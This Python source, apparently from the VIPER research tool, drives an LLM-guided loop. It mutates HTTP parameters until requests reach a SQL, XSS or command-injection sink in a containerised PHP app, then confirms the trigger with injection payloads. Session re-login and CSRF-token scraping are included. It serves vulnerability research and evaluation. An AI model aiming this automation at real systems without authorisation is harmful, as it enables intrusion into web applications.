            http_method=_m, cookie_jar=args.cookie_jar, instr_info_path=str(instr_info_host))
        _md = result["trace"].min_distance
        print(f"  reached_sink: {result['reached_sink']}   min_distance: {_md}")
        tracker.observe(tracker.build_state(i, result["trace"], entry_uri=entry_url))
        _mdv = float(_md) if (_md is not None and _md >= 0) else float("inf")
        if _mdv < _reach_best_dist:
            _reach_best_dist, _reach_best_params = _mdv, dict(_reach_params)
        if result["reached_sink"]:
            _reach_params = _resolve_presence(_reach_params)
            print(f"  ✓ reach succeeded @ reach iter {i}")
            _reached = True
            break
        _tb = result["trace"].terminal_blocker
        if _tb is None:
            print("  ⚠ no terminal blocker, cannot guide directionally; exiting reach phase"); break
        if _tb.kind == "early_exit":
            _tc = (_tb.raw.get("exit") or {}).get("trigger_condition") or {}
            _gloc = {"file": _tc.get("file"), "line": _tc.get("line"), "opcode": _tc.get("opcode")}
            _op1 = ((_tc.get("op1") or {}).get("value")
                    if isinstance(_tc.get("op1"), dict) else _tc.get("op1"))
            _cond = _tc.get("condition_value")
        else:
            _gloc = _tb.location or {}
            _pred = _tb.raw.get("predicate") or {}
            _op1 = ((_pred.get("operands") or {}).get("lhs") or {}).get("value")
            _cond = _pred.get("condition_value")
        if not _gloc.get("line"):
            print(f"  ⚠ {_tb.kind} has no usable guard line (no trigger_condition); exiting reach phase"); break
        _sink_bn = os.path.basename(sink_file)
        _psrc_ctrl = pipeline.get("constraints", {}).get("param_sources", {}) or {}
        try:
            _redir = _redirect_to_controllable_guard(
                int(_gloc.get("line")), _branch_tree,
                _pred_lookahead, _psrc_ctrl, _reach_params, _sink_bn)
        except Exception:
            _redir = None
        if _redir is not None:
            _new_gloc, _new_cond = _redir
            print(f"  ↪ terminal guard :{_gloc.get('line')} not controllable, redirecting to the previous controllable divert branch "
                  f"{_new_gloc.get('file','?').split('/')[-1]}:{_new_gloc.get('line')}")
            _gloc, _cond, _op1 = _new_gloc, _new_cond, None
        if _cpg_idx is None and args.working_dir:
            _nf = Path(args.working_dir) / "nodes.csv"
            _sz = _nf.stat().st_size if _nf.exists() else 0
            if _sz > 1024 * 1024 * 1024:
                print(f"  [reach] nodes.csv {_sz // 1048576}MB exceeds 1GB, skipping CpgIndex, "
                      f"using predicate_lookahead only")
                _cpg_idx = False
            else:
                try:
                    _wd = Path(args.working_dir)
                    _cpg_idx = CpgIndex(str(_wd / "nodes.csv"), str(_wd / "rels.csv"))
                except Exception as _e:
                    print(f"  [reach] CpgIndex load failed (using predicate_lookahead only): {_e}")
                    _cpg_idx = False
        _gt = resolve_guard_target(_gloc.get("file"), _gloc.get("line"),
                                   _pred_lookahead, _cpg_idx, _dist_table,
                                   file_key=_dist_keyer.file_key)
        if _gt is None:
            _bn_ng = _gloc.get('file', '?').split('/')[-1]
            _reach_history.append({"iter": i, "guard": f"{_bn_ng}:{_gloc.get('line')}",
                "guard_code": "(no then/else distance: multi-branch switch or framework layer)", "ctrl_param": None,
                "value": None, "min_dist": _mdv, "want": "?", "then_dist": None, "else_dist": None})
            if tracker.plateau_kind == "stuck" and (i - _unreachable_judged_at) >= 2:
                _unreachable_judged_at = i
                _slice = _reach_guard_slice(sink_file, sink_line, pipeline_result=pipeline,
                                            working_dir="")
                _reach_llm_calls += 1
                _verdict, _why, _sugg = _llm_reach_unreachable_judge(
                    sink={"file": sink_file, "line": sink_line}, guard_loc=_gloc,
                    guard_code=f"stuck at multi-branch {_bn_ng}:{_gloc.get('line')} (e.g. switch), no single "
                               f"then/else direction; the sink is in one of the cases in the slice below",
                    guard_slice=_slice, history=_reach_history[-6:], plateau_kind="stuck",
                    cur_params=_reach_params, want="(multi-branch, see which case the sink is in)",
                    controlling_param=None,
                    llm_call_output_dir=out, llm_call_index=_reach_llm_calls)
                if _verdict == "unreachable":
                    print(f"  ✗ LLM judged reach path UNREACHABLE: {_why}")
                    reach_unreachable = {"reason": _why, "guard": dict(_gloc),
                                         "plateau": "stuck", "iter": i}; break
                if _sugg:
                    print(f"  ↪ LLM breakthrough suggestion: {_why[:90]} → {_sugg}")
                    _reach_params.update(_sugg); continue
                print(f"  · judge ruled reachable with no concrete suggestion ({_why[:40]})")
            if _reach_best_params is not None and _mdv > _reach_best_dist:
                print(f"  ↩ drifted (guard has no distance), rolling back to best cur_body (dist={_reach_best_dist})")
                _reach_params = dict(_reach_best_params)
            elif _reach_best_params is None and _mdv != float("inf"):
                _reach_best_dist, _reach_best_params = _mdv, dict(_reach_params)
            continue
        _ctrl_param = None
        for _p, _n in _branch_tree.params.items():
            if any(int(_b.get("line", -1) or -1) == int(_gloc.get("line", -2) or -2)
                   for _b in _n.controlled_branches):
                _ctrl_param = _p; break
        print(f"  stuck at guard {_gloc.get('file','?').split('/')[-1]}:{_gloc.get('line')}  "
              f"want={'TRUE' if _gt['want_true'] else 'FALSE'} "
              f"(then={_gt['then_dist']} else={_gt['else_dist']} src={_gt.get('source')})"
              f"{' ctrl='+_ctrl_param if _ctrl_param else ''}")
        _reach_history.append({
            "iter": i, "guard": f"{_gloc.get('file','?').split('/')[-1]}:{_gloc.get('line')}",
            "guard_code": _gt.get("guard_code", ""), "ctrl_param": _ctrl_param,
            "value": _reach_params.get(_ctrl_param), "min_dist": _mdv,
            "want": "TRUE" if _gt["want_true"] else "FALSE",
            "then_dist": _gt["then_dist"], "else_dist": _gt["else_dist"]})
        if args.no_llm:
            print("  [reach] --no-llm, skipping LLM guidance; exiting reach phase"); break
        _plat = tracker.plateau_kind
        if _plat == "stuck":
            if (i - _unreachable_judged_at) >= 2:
                _unreachable_judged_at = i
                _exit_ln = (_tb.location or {}).get("line") if _tb.kind == "early_exit" else None
                _slice = _reach_guard_slice(_gloc.get("file"), _gloc.get("line"),
                                            pipeline_result=pipeline, working_dir=args.working_dir,
                                            exit_line=_exit_ln)
                _explored = _reach_exploration_summary(_branch_tree, _reach_tried_cand, _reach_params)
                _reach_llm_calls += 1
                _verdict, _why, _sugg = _llm_reach_unreachable_judge(
                    sink={"file": sink_file, "line": sink_line}, guard_loc=_gloc,
                    guard_code=_gt.get("guard_code", ""), guard_slice=_slice,
                    history=_reach_history[-6:], plateau_kind=_plat,
                    cur_params=_reach_params, want=("TRUE" if _gt["want_true"] else "FALSE"),
                    controlling_param=_ctrl_param, explored_summary=_explored,
                    llm_call_output_dir=out, llm_call_index=_reach_llm_calls)
                if _verdict == "unreachable":
                    print(f"  ✗ judge firmly UNREACHABLE (early exit, skips enumerating the whole tree): {_why}")
                    reach_unreachable = {"reason": _why, "guard": dict(_gloc),
                                         "plateau": _plat, "iter": i, "verdict_kind": "early"}
                    break
                if _sugg:
                    print(f"  ↪ judge breakthrough suggestion: {_why[:90]} → {_sugg}")
                    _reach_params = dict(_reach_best_params or _reach_params)
                    _reach_params.update(_sugg)
                    continue
                print(f"  · judge not confident enough to rule dead ({_why[:50]}) → switching to distance-tree traversal")
            _rb = _reach_tree_rebase(guard_line=_gloc.get("line"), branch_tree=_branch_tree,
                                     cur_params=_reach_params, tried_cand=_reach_tried_cand)
            if _rb is not None:
                _reach_params = _rb["params"]
                print(f"  ⟲ rebase (roll back along distance tree to explore an earlier controllable branch): {_rb['why']}")
                continue
            print(f"  ✗ all controllable branches in the distance tree (incl. presence drop) exhausted, still not reaching sink → REACH_UNREACHABLE (fallback traversal done)")
            reach_unreachable = {"reason": "all controllable branches in the distance tree (incl. presence drop) exhausted, still not reaching sink",
                                 "guard": dict(_gloc), "plateau": _plat, "iter": i,
                                 "verdict_kind": "exhausted"}
            break
        elif _plat in ("regress_dead", "regress_speculative"):
            _rb = _reach_tree_rebase(guard_line=_gloc.get("line"), branch_tree=_branch_tree,
                                     cur_params=_reach_params, tried_cand=_reach_tried_cand)
            if _rb is not None:
                _reach_params = _rb["params"]
                print(f"  ⟲ rebase (drifted → explore controllable branch): {_rb['why']}")
                continue
            if _reach_best_params is not None:
                print(f"  ↩ regress + distance-tree candidates exhausted, rolling back to best (dist={_reach_best_dist}) to change direction")
                _reach_dead.append(f"guard@{_gloc.get('line')}: drifted, candidates exhausted")
                _reach_params = dict(_reach_best_params)
        _disp_cond = _cond
        try:
            if _gt is not None and (bool(_cond) == bool(_gt.get("want_true"))):
                _disp_cond = (not bool(_gt.get("want_true")))
        except Exception:
            _disp_cond = _cond
        _reach_llm_calls += 1
        _reach_params, _rat = _llm_reach_mutate(
            sink={"file": sink_file, "line": sink_line}, guard_loc=_gloc, guard_target=_gt,
            op1_value=_op1, condition_value=_disp_cond, controlling_param=_ctrl_param,
            cur_params=_reach_params, dead_hints=_reach_dead, allowed_params=_reach_allowed,
            llm_call_output_dir=out, llm_call_index=_reach_llm_calls)
        print(f"  → LLM changed params: {_rat[:160]}")
    else:
        print("[m3] reach phase exhausted max_iters, still not reaching sink")

    if _reached:
        _base_params = dict(_reach_params)
        print(f"[m3] reach→confirm handoff: base_params updated to the reaching PoC")

    _best_reach = None

    for i in range(1, max_iters + 1):
        if reach_unreachable is not None:
            break
        import time as _t
        if deadline_ts and _t.perf_counter() >= deadline_ts:
            print(f"[m3] global wallclock deadline hit at iter {i}; stopping reach for this entry")
            break
        iter_index = i
        _iter_t0 = __import__("time").perf_counter()
        if args.bootstrap_url:
            if _bootstrap_relogin():
                print(f"  [bootstrap] re-logged in for iter {i}")
            else:
                print(f"  [bootstrap] WARN: re-login failed for iter {i}")
        if args.inject_divergent_iter == i:
            divergent = dict(cur_params)
            divergent["kind"] = "lookup"
            print(f"\n[P4 TEST HARNESS] iter {i}: forcing divergent kind=lookup "
                  f"(overrides LLM mutation)")
            cur_params = divergent
        print(f"\n══════ iteration {i}  [phase=reach] ══════")
        _decision = _cursor.next_decision()
        if _decision is None:
            print(f"[m3] decision tree exhausted at iter {i}; no more controllable-branch combinations to try")
            break
        cur_params = _resolve_presence({**_base_params, **_decision})
        for _k in discovered_sources:
            cur_params.setdefault(_k, "1")
        print(f"  [branch-tree] decision={_decision or '(base, empty tree)'}")
        _psrc = pipeline.get("constraints", {}).get("param_sources", {}) or {}
        _gp, _pp, _cp = _split_params_by_source(cur_params, _psrc)
        if _url_qs_keys:
            _gp = {k: v for k, v in _gp.items() if k not in _url_qs_keys}
            _pp = {k: v for k, v in _pp.items() if k not in _url_qs_keys}
        _http_method = "GET" if (_gp and not _pp and not _cp) else "POST"
        cur_body = _php_urlencode(_pp)
        get_query = _php_urlencode(_gp)
        _display = ([f"GET ?{get_query}"] if get_query else []) + \
                   ([f"POST {cur_body}"] if cur_body else []) + \
                   ([f"COOKIE {_cp}"] if _cp else [])
        print(f"  PoC: {' | '.join(_display) or '(empty)'}")
        cur_body_for_history = (_php_urlencode(cur_params)
                                 if not get_query else
                                 f"GET[{get_query}]+POST[{cur_body}]")
        result = run_iteration(
            iteration_index=i, container=args.container,
            entry_url=entry_url, post_body=cur_body, output_dir=out,
            sink_file=sink_file, sink_line=sink_line,
            extra_headers=_resolved_headers,
            post_sink_lines=set(pipeline.get("constraints", {})
                                  .get("post_sink_lines", []) or []),
            sink_enclosing_if_lines=set(pipeline.get("constraints", {})
                                          .get("sink_enclosing_if_lines", []) or []),
            pre_sink_lines=set(pipeline.get("constraints", {})
                                 .get("pre_sink_lines", []) or []),
            sink_enclosing_if_body_ranges=pipeline.get("constraints", {})
                                                .get("sink_enclosing_if_body_ranges", []) or [],
            sink_inside_if=pipeline.get("constraints", {}).get("sink_inside_if"),
            file_whitelist=set(pipeline.get("constraints", {})
                                .get("in_scope_files", []) or []),
            get_query=get_query,
            cookies=_cp if _cp else None,
            http_method=_http_method,
            cookie_jar=args.cookie_jar,
            instr_info_path=str(instr_info_host),
        )
        history.add_iteration(result["trace"])
        state = tracker.build_state(i, result["trace"], entry_uri=entry_url)
        tracker.observe(state)
        print(_summarize_trace(result["trace"]))
        print(f"  reached_sink: {result['reached_sink']}")
        print(f"  trace JSON: {result['trace_path']}")
        last_response = result["response"]

        if args.working_dir and (result["reached_sink"]
                                 or tracker.plateau_kind == "stuck"):
            try:
                from module1_static_analysis import source_discovery as _srcdisc
                _known = (set(cur_params)
                          | set(pipeline.get("constraints", {}).get("param_sources", {}) or {})
                          | set(discovered_sources))
                _tb = result["trace"].terminal_blocker
                _tline = None
                if _tb and str((_tb.location or {}).get("line", "")).isdigit():
                    _tline = int(_tb.location["line"])
                _cands = _srcdisc.discover_sources(
                    args.working_dir, sink_file, sink_line,
                    trace=result["trace"], terminal_line=_tline, known_keys=_known)
                for _c in _cands:
                    if not _c.get("reaches_sink"):
                        continue
                    _k = _c["key"]
                    if _k in discovered_sources:
                        continue
                    discovered_sources[_k] = _c
                    _cons = pipeline.setdefault("constraints", {})
                    _cons.setdefault("param_sources", {})[_k] = _c["channel"]
                    _cons.setdefault("injection_chain", []).append({
                        "varname": _k,
                        "source": f"$_{_c['channel']}['{_k}']",
                        "_discovered_via": _c["via"],
                    })
                    print(f"  ⊕ discovered source param '{_k}' @ line "
                          f"{_c['site_line']} (via {_c['via']}, reaches sink) "
                          f"→ added to PoC + Phase-B targets")
                for _k in discovered_sources:
                    cur_params.setdefault(_k, "1")
            except Exception as _e:
                print(f"  [source-discovery] skipped: {type(_e).__name__}: {_e}")

        if p6_engine is not None:
            try:
                refreshed = p6_engine.maybe_refresh(
                    tracker.summary().get("runtime_discoveries", []) or [],
                    dry_run=args.p6_dry_run,
                )
                if refreshed:
                    import time
                    time.sleep(1)
            except Exception as e:
                print(f"  [P6] WARN: refresh hook raised {type(e).__name__}: {e}")

        _iter_reach_wall = __import__("time").perf_counter() - _iter_t0
        metrics_collector.add_time(f"phase_a/iter/{i}/reach", _iter_reach_wall)

        if result["reached_sink"]:
            metrics_collector.add_time(f"phase_a/iter/{i}", _iter_reach_wall)
            metrics_collector.add_time("phase_a/total_iters_sec", _iter_reach_wall)
            metrics_collector.inc_count("phase_a/iters")
            metrics_collector.add_event(
                "phase_a_iter",
                iter_index=i, reached_sink=True,
                min_distance=result["trace"].min_distance,
                elapsed_sec=round(_iter_reach_wall, 3),
            )
            print(f"\n  ✓ sink reached at iter {i}; PoC body locked: {cur_body}")
            if _best_reach is None:
                _best_reach = {"result": result, "cur_params": dict(cur_params),
                               "cur_body": cur_body, "iter": i}
            _oracle_mode = (getattr(args, "oracle_mode", None) or "differential")
            if _oracle_mode != "predator":
                break
            _conf = _reach_confirm_trigger(
                entry_url, pipeline, cur_params, discovered_sources,
                _resolved_headers, args, sink_file, sink_line,
                iter_index=i)
            if _conf.get("triggered"):
                reach_trigger = _conf
                print(f"\n  ★★★ in-loop TRIGGER confirmed (predator oracle) "
                      f"— param={_conf['param']!r} payload={_conf['payload']!r}")
                print(f"      {_conf['reason']}")
                break
            print(f"  ⚠ reached sink at iter {i} but payload did NOT trigger a "
                  f"DB error — routing reached the sink LINE but isn't "
                  f"taint-bearing; backtracking via branch-tree ({_conf['reason']})")

        state_verdict = None
        if not result["reached_sink"]:
            state_verdict = _classify_terminal_state_precondition(
                result["trace"], args.working_dir)
        is_state_block = bool(
            state_verdict
            and state_verdict.get("classification") == "STATE_SEED_REQUIRED")
        if is_state_block:
            if state_verdict.get("tier") == 1:
                print(f"  ⛔ STATE precondition (Tier-1, immediate): "
                      f"{state_verdict.get('required_state')}")
                reach_blocked_verdict = state_verdict
                break
            _gl = state_verdict.get("guard_line")
            _hits = state.terminal_blocker_hits
            if _hits >= _STATE_PRECOND_PATIENCE:
                print(f"  ⛔ STATE precondition (Tier-2, guard {_gl} walled the "
                      f"search {_hits}× despite param exploration): "
                      f"{state_verdict.get('required_state')}")
                reach_blocked_verdict = dict(state_verdict)
                reach_blocked_verdict["tier2_hits"] = _hits
                break
            print(f"  ℹ STATE-derived guard {_gl} hit "
                  f"{_hits}/{_STATE_PRECOND_PATIENCE} "
                  f"(exploring selector params before concluding)")

        _cursor.report(result["reached_sink"], False)
        import os as _dbg_os
        _stop_after_env = _dbg_os.environ.get("VIPER_STOP_AFTER_ITER", "")
        if _stop_after_env and i >= int(_stop_after_env):
            print(f"\n[DEBUG] VIPER_STOP_AFTER_ITER={_stop_after_env} → break at iter {i}")
            max_iters = i
            break

        _iter_wall = __import__("time").perf_counter() - _iter_t0
        metrics_collector.add_time(f"phase_a/iter/{i}", _iter_wall)
        metrics_collector.add_time("phase_a/total_iters_sec", _iter_wall)
        metrics_collector.inc_count("phase_a/iters")
        metrics_collector.add_event(
            "phase_a_iter",
            iter_index=i,
            reached_sink=False,
            min_distance=result["trace"].min_distance,
            score=list(state.score) if 'state' in dir() else None,
            elapsed_sec=round(_iter_wall, 3),
        )


    _final_reached = result.get("reached_sink", False) if result else False
    if (not _final_reached) and _best_reach is not None:
        print(f"[m3] final-round regression did not reach, but iter {_best_reach['iter']} once reached successfully → "
              f"handing the reaching PoC back to Phase B for judgment")
        result = _best_reach["result"]
        cur_params = _best_reach["cur_params"]
        cur_body = _best_reach["cur_body"]
        _final_reached = True

    return {
        "reached_sink": _final_reached,
        "result": result,
        "cur_params": cur_params,
        "cur_body": cur_body if 'cur_body' in dir() else "",
        "discovered_sources": discovered_sources,
        "iter_index": iter_index,
        "reach_blocked_verdict": reach_blocked_verdict,
        "reach_unreachable": reach_unreachable,
        "reach_trigger": reach_trigger,
        "history": history,
    }


def main():
    ap = argparse.ArgumentParser(description="VIPER M3 single-iteration driver.")
    ap.add_argument("--pipeline-result", required=True,
                    help="Path to pipeline_result.json from VIPER/pipeline.py.")
    ap.add_argument("--container", default="viper-sqli-demo")
    ap.add_argument("--output-dir", required=True)
    ap.add_argument("--max-iters", type=int, default=5,
                    help="Max LLM mutation iterations.")
    ap.add_argument("--inject-divergent-iter", type=int, default=0,
                    help="P4 test harness: at this iter (1-indexed), inject a "
                         "PoC with kind=lookup (instead of LLM mutation) to "
                         "force a divergent call_chain_signature; observe whether "
                         "FrontierTracker rejects + driver rebases.")
    ap.add_argument("--budget", type=int, default=3,
                    help="P3: max times a terminal_blocker can fire before "
                         "over_budget_penalty kicks in.")
    ap.add_argument("--plateau-patience", type=int, default=3,
                    help="P5: iters of unchanged best.score before plateau "
                         "flag fires.")
    ap.add_argument("--no-llm", action="store_true",
                    help="Skip LLM mutation between iterations (reuses initial PoC).")
    ap.add_argument("--working-dir", default="",
                    help="P6: path to the TChecker output dir containing "
                         "nodes.csv / rels.csv / cpg_edges.csv. Enables the "
                         "runtime → static feedback loop: dispatch_observed "
                         "events at unmodelled sites trigger an incremental "
                         "edge injection + distance refresh + container "
                         "restart so the next iter sees better distances. "
                         "Empty = P6 closed-loop disabled (still surfaced "
                         "to LLM prompt as before).")
    ap.add_argument("--vuln-type", default="sqli",
                    choices=["sqli", "xss", "cmdi"],
                    help="Oracle dispatch in Phase B. 'sqli' (default) uses "
                         "libcgiwrapper HTTP-000 + Predator SQLi payloads. "
                         "'xss' uses sentinel-reflection detection + XSS "
                         "payloads (no image dependency). 'cmdi' reuses the "
                         "HTTP-000 channel via Widash STRICT=3 (requires the "
                         "container to ship widash as /bin/sh, i.e. images "
                         "based on viper/eval-cmdi-base).")
    ap.add_argument("--oracle-mode",
                    default=os.environ.get("VIPER_ORACLE_MODE", "differential"),
                    choices=["differential", "predator"],
                    help="Trigger-confirmation oracle. 'differential' "
                         "(default): VIPER sentinel-injection + safe-vs-mal "
                         "diff, run as the external Phase B after reach. "
                         "'predator': single-shot DB-error-packet match "
                         "(base/wclibs sqli_error_check) run INSIDE the reach "
                         "loop the moment a sink is reached — reach is only "
                         "declared success if the payload actually triggers a "
                         "DB error; otherwise the loop keeps exploring "
                         "(reach != taint-path).")
    ap.add_argument("--container-root", default="/app/sqli_chain_demo",
                    help="Container-side path under which the app source "
                         "lives. Default matches sqli_chain_demo; for eval "
                         "apps pass e.g. /app/loginsystem.")
    ap.add_argument("--project-root-host", default="",
                    help="Host path of the app's project root. Default "
                         "(empty) falls back to entry_file.parent — correct "
                         "only when entry_file lives at project root (true "
                         "for sqli_chain_demo). For apps with entries in "
                         "subdirs (admin/, public/, web/) pass the actual "
                         "project root explicitly.")
    ap.add_argument("--auth-header", default="",
                    help="Optional HTTP header to attach to every iter "
                         "request: 'Key:Value' format. Repeat with comma "
                         "for multiple. If empty AND --container-root is "
                         "the sqli_chain_demo default, falls back to "
                         "auto-generated X-Admin-Token (backward compat).")
    ap.add_argument("--wallclock-cap", type=int, default=0,
                    help="Hard wallclock budget (seconds) for the whole "
                         "Phase A + Phase B run. 0 = no cap.")
    ap.add_argument("--llm-log", default="",
                    help="If set, env VIPER_LLM_LOG=<path> is exported so "
                         "VIPER/llm.py appends a JSONL per call (eval audit).")
    ap.add_argument("--cookie-jar", default="",
                    help="Netscape-format cookie jar (curl `-c/-b` format) "
                         "produced by a pre-run bootstrap login. When set, "
                         "every request — Phase A reach iters AND Phase B "
                         "differential probes — uses `curl -b <jar>` so the "
                         "app sees an authenticated session. Generic: no "
                         "knowledge of the app's login flow leaks into m3_driver.")
    ap.add_argument("--bootstrap-url", default="",
                    help="POST URL to re-establish an authenticated session "
                         "before EACH iter. Combined with --bootstrap-body. "
                         "Necessary for apps that intentionally invalidate "
                         "the session when request params conflict with "
                         "session state (e.g. OpenEMR's `session_unset()` "
                         "in globals.php:117 when $_SESSION['site_id'] != "
                         "$_GET['site']). Without per-iter re-login, iter 1's "
                         "exploratory PoC may destroy the session and all "
                         "subsequent iters see session-timeout redirects.")
    ap.add_argument("--bootstrap-body", default="",
                    help="POST body for --bootstrap-url (URL-encoded).")
    ap.add_argument("--p6-dry-run", action="store_true",
                    help="P6 maybe_refresh logs the synthetic edges it WOULD "
                         "inject but skips augmented-CSV append + distance "
                         "refresh + container sync. Use on large apps (e.g. "
                         "OpenEMR) where full refresh on a 12M-node CPG "
                         "takes 15min+ per iter — until P6 incremental "
                         "update is implemented (work record §3 severe).")
    args = ap.parse_args()

    if args.llm_log:
        os.environ["VIPER_LLM_LOG"] = args.llm_log

    def _parse_hdr(s: str) -> dict:
        out: dict = {}
        for kv in s.split(","):
            kv = kv.strip()
            if not kv:
                continue
            if ":" not in kv:
                continue
            k, v = kv.split(":", 1)
            out[k.strip()] = v.strip()
        return out
    if args.auth_header:
        _resolved_headers = _parse_hdr(args.auth_header)
    elif args.container_root.rstrip("/").endswith("sqli_chain_demo"):
        _resolved_headers = {"X-Admin-Token": _today_admin_token()}
    else:
        _resolved_headers = {}

    def _refresh_cookies_from_jar(jar_path: str) -> None:
        if not jar_path or not Path(jar_path).exists():
            return
        _drop = [t.strip() for t in os.environ.get("VIPER_COOKIE_DROP", "").split(",") if t.strip()]
        jar_cookies: dict[str, str] = {}
        for line in Path(jar_path).read_text().splitlines():
            stripped = line.strip()
            if not stripped:
                continue
            if stripped.startswith("#HttpOnly_"):
                stripped = stripped[len("#HttpOnly_"):]
            elif stripped.startswith("#"):
                continue
            parts = stripped.split("\t")
            if len(parts) >= 7:
                name = parts[5]
                if any(tok in name for tok in _drop):
                    continue
                jar_cookies[name] = parts[6]
        if jar_cookies:
            non_cookie = {k: v for k, v in _resolved_headers.items()
                          if k.lower() != "cookie"}
            non_cookie["Cookie"] = "; ".join(f"{k}={v}" for k, v in jar_cookies.items())
            _resolved_headers.clear()
            _resolved_headers.update(non_cookie)

    def _bootstrap_relogin() -> bool:
        if not (args.bootstrap_url and args.cookie_jar):
            return False
        jar = args.cookie_jar
        Path(jar).unlink(missing_ok=True)
        body = args.bootstrap_body or ""
        _dbg_relogin = os.environ.get("VIPER_DUMP_REQUEST") == "1"

        login_cfg = None
        _ccp = os.environ.get("VIPER_CSRF_CONFIG", "")
        if _ccp and Path(_ccp).is_file():
            try:
                login_cfg = (json.loads(Path(_ccp).read_text(encoding="utf-8"))
                             or {}).get("login_form")
            except Exception:
                login_cfg = None
        get_url = (login_cfg or {}).get("get_url") or args.bootstrap_url
        g = subprocess.run(
            ["curl", "-sS", "-m", "10", "--noproxy", "*",
             "-c", jar, "-b", jar, get_url],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
        )
        if login_cfg and login_cfg.get("extract_regex"):
            m = re.search(login_cfg["extract_regex"], g.stdout or "")
            if m:
                import urllib.parse as _up
                field = login_cfg.get("field_name", "csrf_token")
                tok = _up.quote(m.group(1), safe="")
                body = (body + "&" if body else "") + f"{field}={tok}"

        proc = subprocess.run(
            ["curl", "-sS", "-m", "10", "--noproxy", "*", "-c", jar, "-b", jar,
             "-X", "POST", args.bootstrap_url,
             "-d", body],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
        )
        ok = Path(jar).exists() and Path(jar).read_text().strip()
        _refresh_cookies_from_jar(jar)
        if _dbg_relogin:
            _lr = proc.stdout or ""
            _chk = subprocess.run(
                ["curl", "-sS", "-m", "10", "--noproxy", "*", "-o", "/dev/null",
                 "-w", "%{http_code}", "-H", f"Cookie: {_resolved_headers.get('Cookie','')}",
                 args.bootstrap_url], capture_output=True, text=True)
            print(f"  [relogin-dbg] login POST resp_len={len(_lr)} "
                  f"login_page_back={'login_username' in _lr.lower()} "
                  f"cookie={_resolved_headers.get('Cookie','')[:45]} "
                  f"authcheck_http={_chk.stdout.strip()}")
        return bool(ok)

    if args.cookie_jar and Path(args.cookie_jar).exists():
        _refresh_cookies_from_jar(args.cookie_jar)
        print(f"[m3] cookie jar loaded from {args.cookie_jar}")

    with open(args.pipeline_result) as f:
        pipeline = json.load(f)
    pipeline["_container_root"] = args.container_root
    if args.project_root_host:
        pipeline["_project_root_host"] = args.project_root_host
    if args.working_dir:
        pipeline["_working_dir"] = args.working_dir

    _method_round = os.environ.get("VIPER_METHOD_ROUND", "").upper()
    if _method_round == "GET":
        os.environ["VIPER_FORCE_GET"] = "1"
        print("[m3] VIPER_METHOD_ROUND=GET → VIPER_FORCE_GET=1 (pure-GET requests)")
    elif _method_round == "POST":
        os.environ["VIPER_FORCE_GET"] = "0"
        print("[m3] VIPER_METHOD_ROUND=POST → VIPER_FORCE_GET=0 (body requests)")
    elif str(pipeline.get("method", "")).upper() == "GET":
        os.environ["VIPER_FORCE_GET"] = "1"
        print("[m3] pipeline method=GET → VIPER_FORCE_GET=1 (pure-GET requests)")

    _csrf_cfg_path = os.environ.get("VIPER_CSRF_CONFIG", "")
    if _csrf_cfg_path and Path(_csrf_cfg_path).is_file():
        try:
            _csrf_cfg = json.loads(Path(_csrf_cfg_path).read_text(encoding="utf-8"))
            _csrf_field = (_csrf_cfg or {}).get("field_name")
        except Exception:
            _csrf_field = None
        if _csrf_field:
            _c = pipeline.get("constraints", {})
            _ps = _c.get("param_sources", {})
            if _csrf_field in _ps:
                _ps.pop(_csrf_field, None)
            _csrf_esc = re.escape(_csrf_field)
            _sg_csrf = (rf"\$_(?:REQUEST|POST|GET|COOKIE)\s*\[\s*['\"]"
                         rf"{_csrf_esc}['\"]\s*\]")
            _csrf_wrap_pats = [
                rf"!?\s*isset\s*\(\s*{_sg_csrf}\s*\)",
                rf"!?\s*empty\s*\(\s*{_sg_csrf}\s*\)",
                rf"{_sg_csrf}\s*[!=]==?\s*['\"][^'\"]*['\"]",
                rf"{_sg_csrf}",
            ]
            _csrf_combined = re.compile("|".join(_csrf_wrap_pats))
            def _scrub_csrf_text(s: str) -> str:
                if not s or _csrf_field not in s:
                    return s
                s2 = _csrf_combined.sub("", s)
                s2 = re.sub(r"\(\s*(?:&&|\|\|)\s*", "(", s2)
                s2 = re.sub(r"\s*(?:&&|\|\|)\s*\)", ")", s2)
                s2 = re.sub(r"\s*(?:&&|\|\|)\s*(?:&&|\|\|)\s*", " && ", s2)
                s2 = re.sub(r"^\s*(?:&&|\|\|)\s*", "", s2)
                s2 = re.sub(r"\s*(?:&&|\|\|)\s*$", "", s2)
                s2 = re.sub(r"\s{2,}", " ", s2).strip()
                return s2
            _ifc = _c.get("if_constraints", [])
            kept = []
            stripped_count = 0
            dropped_count = 0
            for entry in _ifc:
                ep = entry.get("params") or []
                touched = (_csrf_field in ep
                            or _csrf_field in (entry.get("condition") or "")
                            or _csrf_field in (entry.get("raw_line") or ""))
                if not touched:
                    kept.append(entry)
                    continue
                ep = [p for p in ep if p != _csrf_field]
                entry["params"] = ep
                entry.get("param_sources", {}).pop(_csrf_field, None)
                entry["condition"] = _scrub_csrf_text(entry.get("condition") or "")
                entry["raw_line"]  = _scrub_csrf_text(entry.get("raw_line") or "")
                if not ep and not entry["condition"]:
                    dropped_count += 1
                    continue
                stripped_count += 1
                kept.append(entry)
            _c["if_constraints"] = kept
            print(f"[m3] scrubbed framework-managed CSRF field "
                  f"'{_csrf_field}' from constraints "
                  f"(param_sources -1, if_constraints scrubbed={stripped_count} "
                  f"dropped={dropped_count})")

    _drop_cookies = [t.strip() for t in os.environ.get("VIPER_COOKIE_DROP", "").split(",") if t.strip()]
    if _drop_cookies:
        def _is_drop(_k: str) -> bool:
            return any(tok in _k for tok in _drop_cookies)
        _c = pipeline.get("constraints", {})
        _ps = _c.get("param_sources", {})
        _hit = [k for k in list(_ps) if _is_drop(k)]
        for k in _hit:
            _ps.pop(k, None)
        _kept = []
        for entry in _c.get("if_constraints", []):
            _ep = entry.get("params") or []
            _new = [p for p in _ep if not _is_drop(p)]
            if _ep and not _new:
                continue
            entry["params"] = _new
            for k in list(entry.get("param_sources", {})):
                if _is_drop(k):
                    entry["param_sources"].pop(k, None)
            _kept.append(entry)
        _c["if_constraints"] = _kept
        if _hit:
            print(f"[m3] scrubbed session-control cookies {_hit} from constraints "
                  f"(VIPER_COOKIE_DROP)")

    sink_file = pipeline["sink"]["file"]
    sink_line = int(pipeline["sink"]["line"])
    out = Path(args.output_dir)
    try:
        (out / "final_trigger.json").unlink()
    except (FileNotFoundError, OSError):
        pass
    from urllib.parse import urlencode

    print(f"[m3] sink: {sink_file}:{sink_line}")
    _phase_a_t0 = __import__("time").perf_counter()

    entry_candidates = pipeline.get("entry_candidates") or [{"entry_url": pipeline["entry_url"]}]
